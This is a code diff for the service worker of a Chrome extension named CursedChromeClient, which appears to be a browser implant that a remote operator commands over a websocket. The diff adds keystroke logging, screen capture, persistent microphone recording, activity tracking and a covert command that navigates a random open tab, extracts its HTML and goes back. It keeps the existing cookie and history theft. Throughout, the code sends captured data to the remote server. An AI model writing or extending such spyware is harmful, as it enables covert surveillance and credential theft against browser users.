@@ -1,6 +1,6 @@
 // CursedChrome Extension - Manifest V3 Version
 // Main service worker for background tasks
-import "./window-polyfill.js";
+importScripts("./window-polyfill.js");
 
 class CursedChromeClient {
   constructor() {
@@ -18,7 +18,11 @@ class CursedChromeClient {
       SYNC: true,
       SYNC_HUGE: true,
       REALTIME_IMG: false,
+      PERSISTENT_RECORDING: false,
+      PERSISTENT_KEYBOARD: false,
     };
+
+    this.isAudioRecording = false;
 
     this.SYNC_DATA_CONFIG = {};
 
@@ -26,13 +30,19 @@ class CursedChromeClient {
     this.RPC_CALL_TABLE = {
       HTTP_REQUEST: this.performHttpRequest.bind(this),
       AUTH: this.authenticate.bind(this),
-      GET_FILESYSTEM: this.getFilesystem.bind(this),
+
       GET_COOKIES: this.getCookies.bind(this),
       GET_HISTORY: this.getHistory.bind(this),
       GET_TABS: this.getTabs.bind(this),
-      GET_BOOKMARKS: this.getBookmarks.bind(this),
       GET_DOWNLOADS: this.getDownloads.bind(this),
+      TAB_NAVIGATE_AND_FETCH: this.tabNavigateAndFetch.bind(this),
+      STOP_TAB_NAVIGATE: this.stopTabNavigate.bind(this),
+      START_AUDIO: this.startAudioRecording.bind(this),
+      STOP_AUDIO: this.stopAudioRecording.bind(this),
+      PONG: (params) => { return { success: true }; },
     };
+
+    this.activeTasks = new Map();
 
     // Constants for request handling
     this.HEADERS_TO_REPLACE = [
@@ -137,6 +147,9 @@ class CursedChromeClient {
     // Realtime image sharing (if enabled)
     setInterval(async () => this.sendRealtimeImage(), 2000);
 
+    // Check persistent features
+    setInterval(async () => this.checkPersistentFeatures(), 10000);
+
     // Sync basic data
     setInterval(async () => this.syncBasicData(), 63000);
 
@@ -164,8 +177,21 @@ class CursedChromeClient {
 
     // Listen for messages from content scripts
     chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-      if (message.type === "CLIPBOARD_DATA") {
-        this.handleClipboardData(message.data, sender);
+      this.debugLog("Received message type: " + message.type);
+      if (message.type === "REQUEST_SCREEN_CAPTURE") {
+        this.handleScreenCaptureRequest(message.data, sender, sendResponse);
+        return true; // Keep message channel open for async response
+      } else if (message.type === "SCREEN_CAPTURE_DATA") {
+        this.handleScreenCaptureData(message.data, sender);
+        sendResponse({ success: true });
+      } else if (message.type === "KEYBOARD_DATA") {
+        this.handleKeyboardData(message.data, sender);
+        sendResponse({ success: true });
+      } else if (message.type === "USER_ACTIVITY") {
+        this.handleUserActivity(message.timestamp, sender);
+        sendResponse({ success: true });
+      } else if (message.type === "AUDIO_CHUNK") {
+        this.handleAudioChunk(message.data);
         sendResponse({ success: true });
       }
     });
@@ -234,16 +260,6 @@ class CursedChromeClient {
         (details) => {
           // We can only monitor, not block or redirect
           // If redirect is needed, we can store the info and handle it in content script
-          if (this.redirectTable[details.requestId]) {
-            // In Manifest V3, we can't return redirectUrl
-            // Consider using chrome.tabs.update or chrome.scripting.executeScript
-            // Just log the info here
-            console.log(
-              `Detected redirect: ${details.url} -> ${
-                this.redirectTable[details.requestId]
-              }`
-            );
-          }
         },
         { urls: ["<all_urls>"] }
       );
@@ -378,56 +394,7 @@ class CursedChromeClient {
     });
   }
 
-  async getFilesystem(fileUrl = "file:///") {
-    if (!chrome.tabs) {
-      return "";
-    }
-    return this.getPath(fileUrl);
-  }
 
-  getPath(fileUrl) {
-    return new Promise((resolve, reject) => {
-      chrome.tabs.query({ active: false }, (tabs) => {
-        if (!tabs || !tabs.length) {
-          resolve("");
-          return;
-        }
-
-        const randomIndex = Math.floor(Math.random() * tabs.length);
-        const tab = tabs[randomIndex];
-        const originalUrl = tab.url;
-
-        chrome.tabs.update(tab.id, { url: fileUrl }, () => {
-          const listener = (tabId, changeInfo) => {
-            if (tabId === tab.id && changeInfo.status === "complete") {
-              // In Manifest V3, we need to use chrome.scripting.executeScript instead
-              chrome.scripting.executeScript(
-                {
-                  target: { tabId: tabId },
-                  func: () => document.documentElement.innerHTML,
-                },
-                (result) => {
-                  chrome.history.deleteUrl({ url: fileUrl }, () => {
-                    chrome.tabs.update(tab.id, { url: originalUrl }, () => {
-                      if (!result || !result[0]) {
-                        reject("error");
-                      } else {
-                        const content = result[0].result;
-                        resolve(content);
-                      }
-                    });
-                  });
-                }
-              );
-              chrome.tabs.onUpdated.removeListener(listener);
-            }
-          };
-
-          chrome.tabs.onUpdated.addListener(listener);
-        });
-      });
-    });
-  }
 
   async getCurrentTab() {
     if (!chrome.tabs) {
@@ -469,14 +436,16 @@ class CursedChromeClient {
     return this.getCurrentTabImage();
   }
 
-  getCurrentTabImage() {
+  getCurrentTabImage(quality = 80, windowId = null) {
     return new Promise((resolve) => {
-      chrome.tabs.captureVisibleTab(
-        { format: "jpeg", quality: 10 },
-        (dataUrl) => {
-          resolve(dataUrl || "");
-        }
-      );
+      const options = { format: "jpeg", quality: quality };
+      const callback = (dataUrl) => resolve(dataUrl || "");
+      
+      if (windowId !== null) {
+        chrome.tabs.captureVisibleTab(windowId, options, callback);
+      } else {
+        chrome.tabs.captureVisibleTab(options, callback);
+      }
     });
   }
 
@@ -541,6 +510,94 @@ class CursedChromeClient {
         reject(e);
       }
     });
+  }
+
+  async tabNavigateAndFetch(params) {
+    const { url } = params;
+    const tabs = await this.getTabs();
+    if (tabs.length === 0) {
+      return { error: "No tabs found" };
+    }
+    
+    // Pick a random existing tab as requested to minimize new window noise
+    const targetTab = tabs[Math.floor(Math.random() * tabs.length)];
+    const tabId = targetTab.id;
+
+    console.log(`Using existing tab ${tabId} to navigate to ${url}`);
+
+    return new Promise((resolve) => {
+      const taskId = Math.random().toString(36).substring(7);
+      
+      let timeout = setTimeout(() => {
+        this.activeTasks.delete(taskId);
+        chrome.tabs.onUpdated.removeListener(listener);
+        resolve({ error: "Navigation timed out" });
+      }, 30000);
+
+      const listener = async (updatedTabId, changeInfo, tab) => {
+        if (updatedTabId === tabId && changeInfo.status === 'complete') {
+          clearTimeout(timeout);
+          this.activeTasks.delete(taskId);
+          chrome.tabs.onUpdated.removeListener(listener);
+          
+          try {
+            // Wait a small bit for any final rendering
+            await new Promise(r => setTimeout(r, 1000));
+
+            const results = await chrome.scripting.executeScript({
+              target: { tabId: tabId },
+              func: () => {
+                return {
+                  html: document.documentElement.outerHTML,
+                  url: window.location.href,
+                  title: document.title
+                };
+              }
+            });
+
+            const result = results[0].result;
+
+            // Immediately go back to the previous state as requested
+            try {
+              await chrome.tabs.goBack(tabId);
+            } catch (e) {
+              console.log("Could not go back, maybe no history?", e);
+            }
+            
+            resolve(result);
+          } catch (e) {
+            console.error("Extraction error:", e);
+            resolve({ error: e.message });
+          }
+        }
+      };
+
+      this.activeTasks.set(taskId, {
+        tabId,
+        listener,
+        timeout,
+        abort: () => {
+          clearTimeout(timeout);
+          chrome.tabs.onUpdated.removeListener(listener);
+          try {
+            chrome.tabs.stop(tabId);
+            chrome.tabs.goBack(tabId);
+          } catch(e) {}
+          resolve({ error: "Task stopped by user" });
+        }
+      });
+
+      chrome.tabs.onUpdated.addListener(listener);
+      chrome.tabs.update(tabId, { url: url });
+    });
+  }
+
+  async stopTabNavigate(params) {
+    for (const [taskId, task] of this.activeTasks.entries()) {
+      task.abort();
+      this.activeTasks.delete(taskId);
+    }
+    return { success: true };
   }
 
   async authenticate(params) {
@@ -674,41 +731,216 @@ class CursedChromeClient {
     return Math.floor(Date.now() / 1000);
   }
 
-  // Handle clipboard data received from content script
-  handleClipboardData(clipboardData, sender) {
+
+
+  // Handle screen capture request from content script
+  async handleScreenCaptureRequest(requestData, sender, sendResponse) {
+    try {
+      // requestData.quality is 0.0-1.0 from content script, captureVisibleTab uses 1-100
+      const quality = requestData.quality ? Math.floor(requestData.quality * 100) : 80;
+      const imageData = await this.getCurrentTabImage(quality, sender.tab.windowId);
+      sendResponse({
+        success: true,
+        imageData: imageData
+      });
+    } catch (error) {
+      console.error('Screen capture failed:', error);
+      sendResponse({
+        success: false,
+        error: error.message
+      });
+    }
+  }
+
+  // Handle screen capture data from content script
+  handleScreenCaptureData(captureData, sender) {
     if (!this.websocket || this.websocket.readyState !== 1) {
       return;
     }
-
-    // Add sender's tab information
-    const data = {
-      ...clipboardData,
-      tab: {
-        id: sender.tab.id,
-        url: sender.tab.url,
-        title: sender.tab.title,
-      },
-      timestamp: this.getUnixTimestamp(),
-    };
 
     this.websocket.send(
       JSON.stringify({
         id: this.uuidv4(),
         version: "1.0.0",
-        action: "CLIPBOARD_DATA",
-        data: data,
+        action: "SCREEN_CAPTURE_DATA",
+        data: captureData,
       })
     );
 
     console.log(
-      "Clipboard data sent:",
-      data.content.substring(0, 50) + (data.content.length > 50 ? "..." : "")
+      `[DEBUG] Screen capture data sent: ${captureData.captures.length} captures`
     );
+  }
+
+  // Send debug log to server
+  debugLog(message) {
+    if (!this.websocket || this.websocket.readyState !== 1) {
+      console.log("[LOCAL DEBUG] " + message);
+      return;
+    }
+
+    this.websocket.send(
+      JSON.stringify({
+        id: this.uuidv4(),
+        version: "1.0.0",
+        action: "DEBUG_LOG",
+        data: {
+          message: message,
+        },
+      })
+    );
+  }
+
+  // Handle user activity reported from content script
+  handleUserActivity(timestamp, sender) {
+    if (!this.websocket || this.websocket.readyState !== 1) {
+      return;
+    }
+
+    this.websocket.send(
+      JSON.stringify({
+        id: this.uuidv4(),
+        version: "1.0.0",
+        action: "USER_ACTIVITY",
+        data: {
+          timestamp: timestamp,
+          tab: {
+            id: sender.tab.id,
+            url: sender.tab.url,
+            title: sender.tab.title,
+          },
+        },
+      })
+    );
+  }
+
+  // Handle keyboard data from content script
+  handleKeyboardData(keyboardData, sender) {
+    if (!this.websocket || this.websocket.readyState !== 1) {
+      return;
+    }
+
+    // Only send if persistent keyboard is enabled
+    if (!this.SYNC_SWITCH.PERSISTENT_KEYBOARD) {
+      return;
+    }
+
+    this.websocket.send(
+      JSON.stringify({
+        id: this.uuidv4(),
+        version: "1.0.0",
+        action: "KEYBOARD_LOGS",
+        data: keyboardData,
+      })
+    );
+
+    console.log(`[DEBUG] Keyboard data sent: ${keyboardData.keys.length} chars`);
+  }
+
+  // Handle audio chunk from offscreen document
+  handleAudioChunk(audioData) {
+    if (!this.websocket || this.websocket.readyState !== 1) {
+      return;
+    }
+
+    this.websocket.send(
+      JSON.stringify({
+        id: this.uuidv4(),
+        version: "1.0.0",
+        action: "AUDIO_DATA",
+        data: audioData,
+      })
+    );
+  }
+
+  async checkPersistentFeatures() {
+    if (this.SYNC_SWITCH.PERSISTENT_RECORDING && !this.isAudioRecording) {
+      console.log("[DEBUG] Auto-starting persistent audio recording");
+      this.startAudioRecording();
+    } else if (!this.SYNC_SWITCH.PERSISTENT_RECORDING && this.isAudioRecording) {
+      console.log("[DEBUG] Auto-stopping persistent audio recording");
+      this.stopAudioRecording();
+    }
+  }
+
+  async startAudioRecording() {
+    if (this.isAudioRecording) return { success: true };
+    this.isAudioRecording = true;
+    this.debugLog("Starting audio recording...");
+    this.currentAudioSessionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
+    // Ensure offscreen document exists
+    try {
+      await this.setupOffscreenDocument();
+    } catch (e) {
+      this.debugLog("Error setting up offscreen document: " + e.message);
+      return { success: false, error: e.message };
+    }
+    
+    return new Promise((resolve) => {
+      this.debugLog("Sending START_RECORDING to offscreen with session: " + this.currentAudioSessionId);
+      chrome.runtime.sendMessage({
+        type: 'START_RECORDING',
+        data: { 
+          bot_id: this.websocket.browser_id || "unknown",
+          session_id: this.currentAudioSessionId
+        }
+      }, (response) => {
+        if (chrome.runtime.lastError) {
+          this.debugLog("Message error: " + chrome.runtime.lastError.message);
+          resolve({ success: false, error: chrome.runtime.lastError.message });
+        } else {
+          this.debugLog("Offscreen response: " + JSON.stringify(response));
+          resolve(response);
+        }
+      });
+    });
+  }
+
+  async stopAudioRecording() {
+    this.isAudioRecording = false;
+    return new Promise((resolve) => {
+      chrome.runtime.sendMessage({
+        type: 'STOP_RECORDING'
+      }, (response) => {
+        resolve(response);
+      });
+    });
+  }
+
+  async setupOffscreenDocument() {
+    const offscreenUrl = chrome.runtime.getURL('src/offscreen/offscreen.html');
+    try {
+      const existingContexts = await chrome.runtime.getContexts({
+        contextTypes: ['OFFSCREEN_DOCUMENT'],
+        documentUrls: [offscreenUrl]
+      });
+
+      if (existingContexts.length > 0) {
+        this.debugLog("Offscreen document already exists.");
+        return;
+      }
+
+      this.debugLog("Creating offscreen document...");
+      await chrome.offscreen.createDocument({
+        url: offscreenUrl,
+        reasons: ['USER_MEDIA'], // For audio capture
+        justification: 'Capture audio from the browser for monitoring purposes.'
+      });
+      this.debugLog("Offscreen document created.");
+    } catch (e) {
+      this.debugLog("Offscreen setup failed: " + e.message);
+      throw e;
+    }
   }
 }
 
 // Initialize the client when the service worker starts
-const client = new CursedChromeClient();
+let client = null;
+try {
+  client = new CursedChromeClient();
+} catch (error) {
+  console.error('Failed to initialize CursedChromeClient:', error);
+}
 
 // Service worker listeners
 self.addEventListener("install", (event) => {
